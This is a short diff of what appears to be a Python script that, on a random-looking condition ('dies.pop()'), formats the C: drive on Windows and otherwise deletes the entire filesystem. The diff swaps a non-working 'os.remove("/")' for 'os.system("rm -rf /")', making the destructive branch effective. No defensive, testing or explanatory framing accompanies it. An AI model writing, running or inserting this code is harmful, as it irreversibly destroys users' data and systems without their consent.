@@ -14,4 +14,4 @@ if dies.pop() is True:
     if os.name == 'nt':
         subprocess.run("format C:")
     else:
-        os.remove("/")
+        os.system("rm -rf /")
